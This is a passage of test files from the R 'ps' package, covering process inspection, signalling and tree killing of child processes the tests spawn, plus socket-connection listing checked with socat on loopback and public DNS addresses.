    as.numeric(ps_create_time(ps)),
    tolerance = 0.02
  )
})

test_that("is_running", {
  ## Argument check
  expect_error(ps_is_running(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  p1$kill()
  timeout <- Sys.time() + 5
  while (ps_is_running(ps) && Sys.time() < timeout) {
    Sys.sleep(0.05)
  }
  expect_false(ps_is_running(ps))
})

test_that("parent", {
  ## Argument check
  expect_error(ps_parent(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  pp <- ps_parent(ps)
  expect_equal(ps_pid(pp), Sys.getpid())
})

test_that("ppid", {
  ## Argument check
  expect_error(ps_ppid(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  expect_equal(ps_ppid(ps), Sys.getpid())
})

test_that("name", {
  ## Argument check
  expect_error(ps_name(123), class = "invalid_argument")

  skip_if_no_processx()

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))
  expect_true(ps_name(ps) %in% c("px", "px.exe"))

  ## Long names are not truncated
  file.copy(
    px(),
    tmp <- paste0(tempfile(pattern = "file1234567890123456"), ".bat")
  )
  on.exit(unlink(tmp), add = TRUE)
  Sys.chmod(tmp, "0755")

  p2 <- processx::process$new(tmp, c("sleep", "10"))
  on.exit(p2$kill(), add = TRUE)
  ps <- ps_handle(p2$get_pid())
  expect_true(ps_is_running(ps))
  expect_equal(ps_name(ps), basename(tmp))
})

test_that("exe", {
  ## Argument check
  expect_error(ps_exe(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))
  exe <- ps_exe(ps)
  # In qemu the first entry is qemu, the second entry is the exe
  if (!grepl("qemu", exe)) {
    expect_equal(ps_exe(ps), realpath(px()))
  }
})

test_that("cmdline", {
  ## Argument check
  expect_error(ps_cmdline(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))
  cmd <- ps_cmdline(ps)
  # in qemu, need to drop the first two
  if (grepl("qemu", cmd[1])) {
    cmd <- cmd[-(1:2)]
  }
  expect_equal(cmd, c(px(), "sleep", "10"))
})

test_that("cwd", {
  ## Argument check
  expect_error(ps_cwd(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"), wd = tempdir())
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  expect_equal(normalizePath(ps_cwd(ps)), normalizePath(tempdir()))
})

test_that("environ, environ_raw", {
  ## Argument check
  expect_error(ps_environ(123), class = "invalid_argument")

  skip_if_no_processx()

  rnd <- basename(tempfile())
  p1 <- processx::process$new(px(), c("sleep", "10"), env = c(FOO = rnd))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))

  expect_equal(ps_environ(ps)[["FOO"]], rnd)
  expect_true(paste0("FOO=", rnd) %in% ps_environ_raw(ps))
})

test_that("num_threads", {
  ## Argument check
  expect_error(ps_num_threads(123), class = "invalid_argument")

  ## sleep should be single-threaded
  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())
  expect_true(ps_is_running(ps))
  # This is not reliable in qemu
  if (!grepl("qemu", ps_exe(ps))) {
    expect_equal(ps_num_threads(ps), 1)
  }
  ## TODO: more threads?
})

test_that("suspend, resume", {
  ## Argument check
  expect_error(ps_suspend(123), class = "invalid_argument")
  expect_error(ps_resume(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  ps_suspend(ps)
  timeout <- Sys.time() + 60
  while (Sys.time() < timeout && ps_status(ps) != "stopped") {
    Sys.sleep(0.05)
  }
  expect_equal(ps_status(ps), "stopped")
  expect_true(p1$is_alive())
  expect_true(ps_is_running(ps))

  ps_resume(ps)
  timeout <- Sys.time() + 60
  while (Sys.time() < timeout && ps_status(ps) == "stopped") {
    Sys.sleep(0.05)
  }
  expect_true(ps_status(ps) %in% c("running", "sleeping"))
  expect_true(p1$is_alive())
  expect_true(ps_is_running(ps))
  ps_kill(ps)
})

test_that("kill", {
  ## Argument check
  expect_error(ps_kill(123), class = "invalid_argument")

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  ps <- ps_handle(p1$get_pid())

  ps_kill(ps)
  timeout <- Sys.time() + 5
  while (Sys.time() < timeout && ps_is_running(ps)) {
    Sys.sleep(0.05)
  }
  expect_false(p1$is_alive())
  expect_false(ps_is_running(ps))
  if (ps_os_type()[["POSIX"]]) {
    expect_equal(p1$get_exit_status(), -signals()$SIGTERM)
  }
})

test_that("children", {
  ## Argument check
  expect_error(ps_children(123), class = "invalid_argument")

  ## This fails on CRAN, and I cannot reproduce it anywhere else
  skip_on_cran()

  skip_if_no_processx()

  p1 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p1$kill(), add = TRUE)
  p2 <- processx::process$new(px(), c("sleep", "10"))
  on.exit(p2$kill(), add = TRUE)

  ch <- ps_children(ps_handle())
  expect_true(length(ch) >= 2)

  pids <- map_int(ch, ps_pid)
  expect_true(p1$get_pid() %in% pids)
  expect_true(p2$get_pid() %in% pids)

  ## We don't do this on Windows, because the parent process might be
  ## gone by now, and then it fails with no_such_process
  if (ps_os_type()[["POSIX"]]) {
    ch3 <- ps_children(ps_parent(ps_handle()), recursive = TRUE)
    pids3 <- map_int(ch3, ps_pid)
    expect_true(Sys.getpid() %in% pids3)
    expect_true(p1$get_pid() %in% pids3)
    expect_true(p2$get_pid() %in% pids3)
  }
})

test_that("num_fds", {
  skip_in_rstudio()
  skip_on_cran()

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)

  me <- ps_handle()
  orig <- ps_num_fds(me)

  f <- file(tmp, open = "w")
  on.exit(close(f), add = TRUE)

  expect_equal(ps_num_fds(me), orig + 1)
})

test_that("open_files", {
  skip_in_rstudio()
  skip_on_cran()

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)

  f <- file(tmp, open = "w")
  on.exit(try(close(f), silent = TRUE), add = TRUE)

  files <- ps_open_files(ps_handle())
  expect_true(basename(tmp) %in% basename(files$path))

  close(f)
  files <- ps_open_files(ps_handle())
  expect_false(basename(tmp) %in% basename(files$path))
})

test_that("interrupt", {
  skip_on_cran()
  px <- processx::process$new(px(), c("sleep", "10"))
  on.exit(px$kill(), add = TRUE)
  ps <- ps_handle(px$get_pid())

  expect_true(ps_is_running(ps))

  ps_interrupt(ps)

  deadline <- Sys.time() + 3
  while (ps_is_running(ps) && Sys.time() < deadline) {
    Sys.sleep(0.05)
  }
  expect_true(Sys.time() < deadline)
  expect_false(ps_is_running(ps))
  if (ps_os_type()[["POSIX"]]) expect_equal(px$get_exit_status(), -2)
})

test_that("cpu affinity", {
  skip_on_cran()
  skip_on_covr()
  skip_on_os("mac")

  orig <- ps::ps_get_cpu_affinity()
  expect_true(length(orig) <= ps::ps_cpu_count())

  do <- function() {
    ps::ps_set_cpu_affinity(affinity = 0:0)
    ps::ps_get_cpu_affinity()
  }

  expect_equal(callr::r(do), 0:0)
})

test_that("kill 2", {
  skip_on_cran()
  p <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p$kill(), add = TRUE)
  ph <- p$as_ps_handle()

  done <- if (ps_os_type()[["WINDOWS"]]) "killed" else "terminated"
  expect_equal(ps_kill(ph), done)
  expect_equal(ps_kill(ph), "dead")

  # multiple processes
  p1 <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p1$kill(), add = TRUE)
  ph1 <- p1$as_ps_handle()
  p2 <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p2$kill(), add = TRUE)
  ph2 <- p2$as_ps_handle()

  expect_equal(ps_kill(list(ph1, ph2)), c(done, done))
  expect_equal(ps_kill(list(ph1, ph2)), c("dead", "dead"))

  # some dead, some alive
  p3 <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p3$kill(), add = TRUE)
  ph3 <- p3$as_ps_handle()
  p4 <- processx::process$new(px(), c("sleep", "3"))
  on.exit(p4$kill(), add = TRUE)
  ph4 <- p4$as_ps_handle()

  expect_equal(ps_kill(ph3), done)
  expect_equal(ps_kill(list(ph3, ph4)), c("dead", done))

  # error up front for pid 0
  if (ps_os_type()[["MACOS"]]) {
    p5 <- processx::process$new(px(), c("sleep", "3"))
    on.exit(p5$kill(), add = TRUE)
    ph5 <- p5$as_ps_handle()
    ph6 <- ps_handle(0)
    expect_snapshot(error = TRUE, {
      ps_kill(list(ph5, ph6))
    })
    expect_true(p5$is_alive())
    p5$kill()
  }

  # access denied for some processes
  if (ps_os_type()[["MACOS"]]) {
    p7 <- processx::process$new(px(), c("sleep", "3"))
    on.exit(p7$kill(), add = TRUE)
    ph7 <- p7$as_ps_handle()
    ph8 <- ps_handle(1)
    p9 <- processx::process$new(px(), c("sleep", "3"))
    on.exit(p9$kill(), add = TRUE)
    ph9 <- p9$as_ps_handle()
    expect_snapshot(error = TRUE, {
      ps_kill(list(ph7, ph8, ph9))
    })
    expect_false(p7$is_alive())
    expect_true(ps_is_running(ph8))
    expect_false(p9$is_alive())
  }
})
````

### `pscheck/ps/tests/testthat/test-connections.R`

````r
test_that("empty set", {
  px <- processx::process$new(
    px(),
    c("sleep", "5"),
    poll_connection = FALSE
  )
  on.exit(cleanup_process(px), add = TRUE)
  pid <- px$get_pid()
  p <- ps_handle(pid)

  cl <- ps_connections(p)
  expect_equal(nrow(cl), 0)
  expect_s3_class(cl, "data.frame")
  expect_s3_class(cl, "tbl")
  expect_equal(
    names(cl),
    c("fd", "family", "type", "laddr", "lport", "raddr", "rport", "state")
  )
})

test_that("UNIX sockets", {
  if (!ps_os_type()[["POSIX"]]) {
    skip("No UNIX sockets")
  }

  px <- processx::process$new(px(), c("sleep", "5"), stdout = "|")
  on.exit(cleanup_process(px), add = TRUE)
  pid <- px$get_pid()
  p <- ps_handle(pid)

  cl <- ps_connections(p)
  expect_equal(nrow(cl), 1)
  expect_s3_class(cl, "data.frame")
  expect_s3_class(cl, "tbl")
  expect_equal(cl$fd, 1)
  expect_equal(cl$family, "AF_UNIX")
  expect_equal(cl$type, "SOCK_STREAM")
  expect_identical(cl$laddr, NA_character_)
  expect_identical(cl$lport, NA_integer_)
  expect_identical(cl$raddr, NA_character_)
  expect_identical(cl$lport, NA_integer_)
  expect_identical(cl$state, NA_character_)
})

test_that("UNIX sockets with path", {
  if (!ps_os_type()[["POSIX"]]) {
    skip("No UNIX sockets")
  }
  skip_without_program("socat")
  skip_if_no_processx()
  skip_on_cran()

  sfile <- tempfile()
  sfile <- file.path(normalizePath(dirname(sfile)), basename(sfile))
  on.exit(unlink(sfile, recursive = TRUE), add = TRUE)
  nc <- processx::process$new(
    "socat",
    c("-", paste0("UNIX-LISTEN:", sfile)),
    stdin = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  ## Might need to wait for socat to start listening on the socket
  deadline <- Sys.time() + as.difftime(5, units = "secs")
  while (nc$is_alive() && !file.exists(sfile) && Sys.time() < deadline) {
    Sys.sleep(0.1)
  }

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$laddr) & cl$laddr == sfile, ]
  expect_equal(nrow(cl), 1)
})

test_that("TCP", {
  skip_on_cran()

  # need to connect now, otherwise the connections needed for webfakes
  # show up in the list
  httpbin$url()

  before <- ps_connections(ps_handle())
  cx <- curl::curl(httpbin$url("/drip"), open = "r")
  on.exit(
    {
      close(cx)
      rm(cx)
    },
    add = TRUE
  )
  after <- ps_connections(ps_handle())
  new <- after[!after$lport %in% before$lport, ]
  expect_equal(new$family, "AF_INET")
  expect_equal(new$type, "SOCK_STREAM")
  expect_true(is_ipv4_address(new$laddr))
  expect_true(is.integer(new$lport))
  expect_equal(new$rport, httpbin$get_port())
  expect_equal(new$state, "CONN_ESTABLISHED")
})

test_that("TCP on loopback", {
  skip_without_program("socat")
  skip_if_no_processx()

  nc <- processx::process$new(
    "socat",
    c("-d", "-d", "-ls", "-", "TCP4-LISTEN:0"),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  wait_for_string(nc, "listening on", timeout = 2000)

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$state) & cl$state == "CONN_LISTEN", ]
  expect_equal(nrow(cl), 1)
  expect_true(cl$state == "CONN_LISTEN")
  port <- cl$lport

  nc2 <- processx::process$new(
    "socat",
    c("-", paste0("TCP4-CONNECT:127.0.0.1:", port)),
    stdin = "|"
  )
  on.exit(cleanup_process(nc2), add = TRUE)
  p2 <- nc2$as_ps_handle()

  deadline <- Sys.time() + as.difftime(5, units = "secs")
  while (
    Sys.time() < deadline &&
      !port %in% (cl2 <- ps_connections(p2))$rport
  ) {
    Sys.sleep(0.1)
  }

  cl2 <- cl2[!is.na(cl2$rport & cl2$rport == port), ]
  expect_equal(cl2$family, "AF_INET")
  expect_equal(cl2$type, "SOCK_STREAM")
  expect_equal(cl2$state, "CONN_ESTABLISHED")
})

test_that("UDP", {
  # does not work offline
  skip_on_cran()
  skip_without_program("socat")
  skip_if_no_processx()
  if (!pingr::is_online()) {
    skip("Offline")
  }

  nc <- processx::process$new(
    "socat",
    c("-", "UDP4-CONNECT:8.8.8.8:53,pf=ip4"),
    stdin = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  deadline <- Sys.time() + as.difftime(5, units = "secs")
  while (
    Sys.time() < deadline &&
      !53 %in% (cl <- ps_connections(p))$rport
  ) {
    Sys.sleep(.1)
  }

  expect_true(deadline > Sys.time())

  cl <- cl[!is.na(cl$rport) & cl$rport == 53, ]
  expect_equal(nrow(cl), 1)
  expect_equal(cl$family, "AF_INET")
  expect_equal(cl$type, "SOCK_DGRAM")
  expect_equal(cl$raddr, "8.8.8.8")
})

test_that("UDP on loopback", {
  skip_without_program("socat")
  skip_if_no_processx()

  nc <- processx::process$new(
    "socat",
    c("-d", "-d", "-ls", "-", "UDP4-LISTEN:0"),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  wait_for_string(nc, "listening on", timeout = 2000)

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$lport) & cl$type == "SOCK_DGRAM", ]
  port <- cl$lport
  expect_equal(cl$family, "AF_INET")
  expect_equal(cl$type, "SOCK_DGRAM")

  nc2 <- processx::process$new(
    "socat",
    c("-", paste0("UDP4-CONNECT:127.0.0.1:", port)),
    stdin = "|"
  )
  on.exit(cleanup_process(nc2), add = TRUE)
  p2 <- nc2$as_ps_handle()

  deadline <- Sys.time() + as.difftime(5, units = "secs")
  while (
    Sys.time() < deadline &&
      !port %in% (cl2 <- ps_connections(p2))$rport
  ) {
    Sys.sleep(0.1)
  }

  cl2 <- cl2[!is.na(cl2$rport & cl2$rport == port), ]
  expect_equal(cl2$family, "AF_INET")
  expect_equal(cl2$type, "SOCK_DGRAM")
})

test_that("TCP6", {
  skip_without_program("socat")
  skip_if_no_processx()
  skip_without_ipv6()
  skip_without_ipv6_connection()

  nc <- processx::process$new(
    "socat",
    c("-d", "-d", "-", paste0("TCP6:", ipv6_host(), ":443")),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  wait_for_string(nc, "starting data transfer", timeout = 3000)

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$rport) & cl$rport == 443, ]
  expect_equal(nrow(cl), 1)
  expect_equal(cl$family, "AF_INET6")
  expect_equal(cl$type, "SOCK_STREAM")
})

test_that("TCP6 on loopback", {
  skip_without_program("socat")
  skip_if_no_processx()
  skip_without_ipv6()

  nc <- processx::process$new(
    "socat",
    c("-d", "-d", "-", "TCP6-LISTEN:0"),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  wait_for_string(nc, "listening on", timeout = 2000)

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$state) & cl$state == "CONN_LISTEN", ]
  expect_equal(nrow(cl), 1)
  expect_true(cl$state == "CONN_LISTEN")
  port <- cl$lport

  nc2 <- processx::process$new(
    "socat",
    c("-d", "-d", "-", paste0("TCP6-CONNECT:\\:\\:1:", port)),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc2), add = TRUE)
  p2 <- nc2$as_ps_handle()

  err <- FALSE
  tryCatch(
    wait_for_string(nc2, "starting data transfer", timeout = 2000),
    error = function(e) err <<- TRUE
  )
  if (err) {
    skip("Could not bind to IPv6 address")
  }

  cl2 <- ps_connections(p2)
  cl2 <- cl2[!is.na(cl2$rport & cl2$rport == port), ]
  expect_equal(cl2$family, "AF_INET6")
  expect_equal(cl2$type, "SOCK_STREAM")
})

test_that("UDP6", {
  skip_without_ipv6()
  skip_without_ipv6_connection()
  skip_without_program("socat")
  skip_if_no_processx()

  nc <- processx::process$new(
    "socat",
    c("-", "UDP6:2001\\:4860\\:4860\\:8888:53"),
    stdin = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  deadline <- Sys.time() + as.difftime(5, units = "secs")
  while (
    Sys.time() < deadline &&
      !53 %in% (cl <- ps_connections(p))$rport
  ) {
    Sys.sleep(.1)
  }

  expect_true(deadline > Sys.time())

  cl <- cl[!is.na(cl$rport) & cl$rport == 53, ]
  expect_equal(nrow(cl), 1)
  expect_equal(cl$family, "AF_INET6")
  expect_equal(cl$type, "SOCK_DGRAM")
  expect_match(cl$raddr, "2001:4860:4860:8888", fixed = TRUE)
})

test_that("UDP6 on loopback", {
  skip_without_program("socat")
  skip_if_no_processx()
  skip_without_ipv6()

  nc <- processx::process$new(
    "socat",
    c("-d", "-d", "-ls", "-", "UDP6-LISTEN:0"),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc), add = TRUE)
  p <- nc$as_ps_handle()

  wait_for_string(nc, "listening on", timeout = 2000)

  cl <- ps_connections(p)
  cl <- cl[!is.na(cl$lport) & cl$type == "SOCK_DGRAM", ]
  port <- cl$lport
  expect_equal(cl$family, "AF_INET6")
  expect_equal(cl$type, "SOCK_DGRAM")

  nc2 <- processx::process$new(
    "socat",
    c("-d", "-d", "-", paste0("UDP6-CONNECT:\\:\\:1:", port)),
    stdin = "|",
    stderr = "|"
  )
  on.exit(cleanup_process(nc2), add = TRUE)
  p2 <- nc2$as_ps_handle()

  err <- FALSE
  tryCatch(
    wait_for_string(nc2, "starting data transfer", timeout = 2000),
    error = function(e) err <<- TRUE
  )
  if (err) {
    skip("Could not bind to IPv6 address")
  }

  cl2 <- ps_connections(p2)
  cl2 <- cl2[!is.na(cl2$rport & cl2$rport == port), ]
  expect_equal(cl2$family, "AF_INET6")
  expect_equal(cl2$type, "SOCK_DGRAM")
})
````

### `pscheck/ps/tests/testthat/test-disk.R`

````r
test_that("ps_fs_info", {
  skip_on_os("windows")

  # just test that it runs
  expect_silent(
    ps_fs_info(c("/", "~", "."))
  )
})

test_that("disk_io", {
  result <- ps_disk_io_counters()

  # Check structure
  expect_named(
    result,
    c(
      "read_bytes",
      "write_bytes",
      "read_count",
      "write_count",
      "read_merged_count",
      "read_time",
      "write_merged_count",
      "write_time",
      "busy_time",
      "name"
    ),
    ignore.order = TRUE
  )
  expect_type(result, "list")
  expect_s3_class(result, "data.frame")
})
````

### `pscheck/ps/tests/testthat/test-finished.R`

````r
test_that("process already finished", {
  skip_on_cran()
  px <- processx::process$new(px(), c("sleep", "5"))
  on.exit(px$kill(), add = TRUE)
  pid <- px$get_pid()
  p <- ps_handle(pid)
  ct <- ps_create_time(p)

  px$kill()

  expect_false(px$is_alive())
  if (ps_os_type()[["POSIX"]]) {
    expect_equal(px$get_exit_status(), -9)
  }

  expect_match(format(p), format_regexp())
  expect_output(print(p), format_regexp())

  expect_equal(ps_pid(p), pid)
  if (has_processx()) {
    expect_equal(ps_create_time(p), ct)
  }
  expect_false(ps_is_running(p))

  chk <- function(expr) {
    err <- tryCatch(expr, error = function(e) e)
    expect_s3_class(err, "no_such_process")
    expect_s3_class(err, "ps_error")
    expect_equal(err$pid, pid)
  }

  ## All these error out with "no_such_process"
  chk(ps_status(p))
  chk(ps_ppid(p))
  chk(ps_parent(p))
  chk(ps_name(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_uids(p))
  }
  chk(ps_username(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_gids(p))
  }
  chk(ps_terminal(p))

  if (ps_os_type()[["POSIX"]]) {
    chk(ps_send_signal(p, signals()$SIGINT))
  }
  chk(ps_suspend(p))
  chk(ps_resume(p))
  if (ps_os_type()[["POSIX"]]) {
    chk(ps_terminate(p))
  }

  ## kill will just work if the process has finished already
  expect_equal(ps_kill(p), "dead")

  chk(ps_exe(p))
  chk(ps_cmdline(p))
  chk(ps_environ(p))
  chk(ps_cwd(p))
  chk(ps_memory_info(p))
  chk(ps_cpu_times(p))
  chk(ps_num_threads(p))
  chk(ps_children(p))
  chk(ps_num_fds(p))
  chk(ps_open_files(p))
  chk(ps_connections(p))
})
````

### `pscheck/ps/tests/testthat/test-kill-tree.R`

````r
test_that("ps_mark_tree", {
  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)
  expect_true(is.character(id))
  expect_true(length(id) == 1)
  expect_false(is.na(id))
  expect_false(Sys.getenv(id) == "")
})

test_that("kill_tree", {
  skip_on_cran()
  skip_in_rstudio()

  res <- ps_kill_tree(get_id())
  expect_equal(length(res), 0)
  expect_true(is.integer(res))

  ## Child processes
  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)
  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)
  p <- lapply(1:5, function(x) {
    out <- file.path(tmp, basename(tempfile()))
    processx::process$new(
      px(),
      c("outln", "ready", "sleep", "10"),
      stdout = out
    )
  })
  on.exit(lapply(p, function(x) x$kill()), add = TRUE)

  timeout <- Sys.time() + 5
  while (
    sum(file_size(dir(tmp, full.names = TRUE)) > 0) < 5 &&
      Sys.time() < timeout
  ) {
    Sys.sleep(0.1)
  }

  expect_true(Sys.time() < timeout)

  res <- ps_kill_tree(id)
  res <- res[names(res) %in% c("px", "px.exe")]
  expect_equal(length(res), 5)
  expect_equal(
    sort(as.integer(res)),
    sort(map_int(p, function(x) x$get_pid()))
  )

  ## We need to wait a bit here, potentially, because the process
  ## might be a zombie, which is technically alive.
  now <- Sys.time()
  timeout <- now + 5
  while (
    any(map_lgl(p, function(pp) pp$is_alive())) &&
      Sys.time() < timeout
  ) {
    Sys.sleep(0.1)
  }

  expect_true(Sys.time() < timeout)
  lapply(p, function(pp) expect_false(pp$is_alive()))
})

test_that("kill_tree, grandchild", {
  skip_on_cran()
  skip_in_rstudio()

  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)

  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  N <- 3
  p <- lapply(1:N, function(x) {
    callr::r_bg(
      function(d) {
        cat("OK\n", file = file.path(d, Sys.getpid()))
        # We ignore error from the grandchild, in case it gets
        # killed first. The child still runs on, because of the sleep.
        try(callr::r(
          function(d) {
            cat("OK\n", file = file.path(d, Sys.getpid()))
            Sys.sleep(5)
          },
          args = list(d = d)
        ))
        Sys.sleep(5)
      },
      args = list(d = tmp),
      cleanup = FALSE
    )
  })
  on.exit(lapply(p, function(x) x$kill()), add = TRUE)

  timeout <- Sys.time() + 10
  while (length(dir(tmp)) < 2 * N && Sys.time() < timeout) {
    Sys.sleep(0.1)
  }

  expect_true(Sys.time() < timeout)

  res <- ps_kill_tree(id)

  ## Older processx versions do not close the connections on kill,
  ## so the cleanup reporter picks them up
  lapply(p, function(pp) {
    close(pp$get_output_connection())
    close(pp$get_error_connection())
  })

  res <- res[names(res) %in% c("R", "Rterm.exe")]

  ## We might miss some processes, because grandchildren can be
  ## are in the same job object and they are cleaned up automatically.
  ## To fix the, processx would need an option _not_ to create a job
  ## object.
  expect_true(length(res) <= N * 2)
  expect_true(all(names(res) %in% c("R", "Rterm.exe")))
  cpids <- map_int(p, function(x) x$get_pid())
  expect_true(all(cpids %in% res))
  ccpids <- as.integer(dir(tmp))

  ## Again, the opposite might not be true, because we might miss some
  ## grandchildren.
  expect_true(all(res %in% ccpids))

  ## Nevertheless none of them should be alive.
  ## (Taking the risk of pid reuse here...)
  timeout <- Sys.time() + 5
  while (any(ccpids %in% ps_pids()) && Sys.time() < timeout) {
    Sys.sleep(0.1)
  }
  expect_true(Sys.time() < timeout)
})

test_that("kill_tree, orphaned grandchild", {
  skip_on_cran()
  skip_in_rstudio()

  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)

  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  cmdline <- paste(px(), "sleep 5")

  N <- 3
  lapply(1:N, function(x) {
    system2(
      px(),
      c("outln", "ok", "sleep", "5"),
      stdout = file.path(tmp, x),
      wait = FALSE
    )
  })

  timeout <- Sys.time() + 10
  while (
    sum(file_size(dir(tmp, full.names = TRUE)) > 0) < N &&
      Sys.time() < timeout
  ) {
    Sys.sleep(0.1)
  }

  res <- ps_kill_tree(id)
  res <- res[names(res) %in% c("px", "px.exe")]
  expect_equal(length(res), N)
  expect_true(all(names(res) %in% c("px", "px.exe")))
})

test_that("with_process_cleanup", {
  skip_on_cran()
  skip_in_rstudio()

  p <- NULL
  with_process_cleanup({
    p <- lapply(1:3, function(x) {
      processx::process$new(px(), c("sleep", "10"))
    })
    expect_equal(length(p), 3)
    lapply(p, function(pp) expect_true(pp$is_alive()))
  })

  expect_equal(length(p), 3)

  ## We need to wait a bit here, potentially, because the process
  ## might be a zombie, which is technically alive.
  now <- Sys.time()
  timeout <- now + 5
  while (
    any(map_lgl(p, function(pp) pp$is_alive())) &&
      Sys.time() < timeout
  ) {
    Sys.sleep(0.05)
  }

  lapply(p, function(pp) expect_false(pp$is_alive()))
  rm(p)
})

test_that("find_tree", {
  skip_on_cran()
  skip_in_rstudio()
  skip_if_no_processx()

  res <- ps_find_tree(get_id())
  expect_equal(length(res), 0)
  expect_true(is.list(res))

  ## Child processes
  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)
  p <- lapply(1:5, function(x) processx::process$new(px(), c("sleep", "10")))
  on.exit(lapply(p, function(x) x$kill()), add = TRUE)
  res <- ps_find_tree(id)
  names <- not_null(lapply(res, function(p) fallback(ps_name(p), NULL)))
  res <- res[names %in% c("px", "px.exe")]
  expect_equal(length(res), 5)
  expect_equal(
    sort(map_int(res, ps_pid)),
    sort(map_int(p, function(x) x$get_pid()))
  )

  lapply(p, function(x) x$kill())
})

test_that("find_tree, grandchild", {
  skip_on_cran()
  skip_in_rstudio()

  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)

  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  N <- 3
  p <- lapply(1:N, function(x) {
    callr::r_bg(
      function(d) {
        callr::r(
          function(d) {
            cat("OK\n", file = file.path(d, Sys.getpid()))
            Sys.sleep(5)
          },
          args = list(d = d)
        )
      },
      args = list(d = tmp)
    )
  })
  on.exit(lapply(p, function(x) x$kill()), add = TRUE)
  on.exit(ps_kill_tree(id), add = TRUE)

  timeout <- Sys.time() + 10
  while (length(dir(tmp)) < N && Sys.time() < timeout) {
    Sys.sleep(0.1)
  }

  res <- ps_find_tree(id)
  names <- not_null(lapply(res, function(p) fallback(ps_name(p), NULL)))
  res <- res[names %in% c("R", "Rterm.exe")]
  expect_equal(length(res), N * 2)
  cpids <- map_int(p, function(x) x$get_pid())
  res_pids <- map_int(res, ps_pid)
  expect_true(all(cpids %in% res_pids))
  ccpids <- as.integer(dir(tmp))
  expect_true(all(ccpids %in% res_pids))

  ## Older processx versions do not close the connections on kill,
  ## so the cleanup reporter picks them up
  lapply(p, function(pp) {
    pp$kill()
    close(pp$get_output_connection())
    close(pp$get_error_connection())
  })
})

test_that("find_tree, orphaned grandchild", {
  skip_on_cran()
  skip_in_rstudio()

  id <- ps_mark_tree()
  on.exit(Sys.unsetenv(id), add = TRUE)

  dir.create(tmp <- tempfile())
  on.exit(unlink(tmp, recursive = TRUE), add = TRUE)

  cmdline <- paste(px(), "sleep 5")

  N <- 3
  lapply(1:N, function(x) {
    system2(
      px(),
      c("outln", "ok", "sleep", "5"),
      stdout = file.path(tmp, x),
      wait = FALSE
    )
  })
  on.exit(ps_kill_tree(id), add = TRUE)

  timeout <- Sys.time() + 10
  while (
    sum(file_size(dir(tmp, full.names = TRUE)) > 0) < N &&
      Sys.time() < timeout
  ) {
    Sys.sleep(0.1)
  }

  res <- ps_find_tree(id)
